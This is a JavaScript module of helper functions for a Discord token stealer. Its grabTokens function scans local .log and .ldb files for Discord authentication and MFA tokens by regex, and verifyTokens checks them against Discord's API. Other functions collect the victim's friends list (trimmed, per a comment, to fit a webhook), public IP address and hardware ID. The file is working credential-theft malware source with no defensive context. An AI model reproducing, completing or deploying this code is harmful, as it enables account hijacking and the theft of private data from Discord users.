const { getHWID } = require('hwid')
const moment = require('moment');
const axios = require('axios');
const fs = require('fs');

module.exports = {


    // ID to creation date, Credits: hugonun

    convertIDtoUnix: (id) => {
        var bin = (+id).toString(2);
        var unixbin = '';
        var unix = '';
        var m = 64 - bin.length;
        unixbin = bin.substring(0, 42 - m);
        unix = parseInt(unixbin, 2) + 1420070400000;
        return unix;
    },

    convert: (id) => {
        var unix = module.exports.convertIDtoUnix(id.toString());
        var timestamp = moment.unix(unix / 1000);
        return timestamp.format('YYYY-MM-DD, HH:mm:ss');
    },


    // Discord API

    header: (token = undefined, contentType = "application/json") => {
        headers = {
            "Content-Type": contentType,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
        }

        if (token) {
            headers["Authorization"] = token;
        }

        return headers;
    },

    get: async (link, options = {}) => {
        let res;

        try {
            if (options.hasOwnProperty('headers') && options.headers === true) {
                if (!options.token) return;
                res = await axios.get(link, { headers: module.exports.header(options.token) });
                return res.data;
            } else {
                res = await axios.get(link);
                return res.data;
            }
        } catch (err) {
            if (err.response.status === 401) {
                return undefined;
            } else {
                return;
            }
        }
    },


    // Token stuff

    verifyTokens: async (tokens = []) => {
        let validTokens = [];
        let res;

        for (let i = 0; i < tokens.length; i++) {
            test = await module.exports.user(tokens[i]);
            if (!test) continue;

            validTokens.push(tokens[i])
        }

        return validTokens;
    },

    grabTokens: (path) => {
        let directory = fs.readdirSync(path);
        let gatheredTokens = [];

        for (let file of directory) {
            if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;

            let buffer = fs.readFileSync(path + file).toString("utf-8");
            if (buffer == null) continue;

            let matches = buffer.match(/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/);
            if (matches == null) continue;

            gatheredTokens.push(matches[0])
        }

        const verifiedTokens = module.exports.verifyTokens(gatheredTokens);
        return verifiedTokens;
    },


    // Get info

    user: async (token) => {
        return await module.exports.get('https://discordapp.com/api/v6/users/@me', { headers: true, token: token })
    },

    friends: async (token) => {
        let friendsList = await module.exports.get('https://discordapp.com/api/v6/users/@me/relationships', { headers: true, token: token })
        let friends;

        for (let i = 0; i < friendsList.length; i++) {
            friends += `\`\`\`${friendsList[i].user.username}#${friendsList[i].user.discriminator}\n\`\`\``
        }

        // Makes the list shorter to fit in the webhook.
        if (friends.length > 1020) {
            friends = friends.substr(0, 1017) + '...\`\`\`';
        }

        return friends;
    },

    ip: async () => {
        return await module.exports.get('https://api.bluefoxhost.com/v1/ip/me', { headers: false })
    },

    hwid: async () => {
        return await getHWID()
    }
}
